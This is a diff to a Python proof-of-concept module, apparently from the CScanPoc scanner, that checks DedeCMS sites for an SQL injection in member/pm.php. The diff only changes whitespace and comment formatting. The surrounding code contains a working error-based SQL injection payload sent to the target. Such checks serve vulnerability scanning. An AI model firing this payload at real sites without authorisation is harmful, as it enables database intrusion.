@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'DedeCMS_0041_L' # 平台漏洞编号，留空
+    vuln_id = 'DedeCMS_0041_L'  # 平台漏洞编号，留空
     name = 'DedeCMS member/pm.php sql注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-02-26'  # 漏洞公布时间
     desc = '''
         DedeCMS 在member/pm.php中存在注入漏洞。
@@ -32,14 +33,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #漏洞需要会员登录
+
+            # 漏洞需要会员登录
             s = requests.session()
             payload = '/dede/member/pm.php'
             data = "?dopost=read&id=1' and @`'` and (select 1 from (select count(*),concat(md5(c),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1"
             url = self.target + payload
             s.get(url)
-            r = s.post(url, data=data) 
+            r = s.post(url, data=data)
 
             if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -50,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
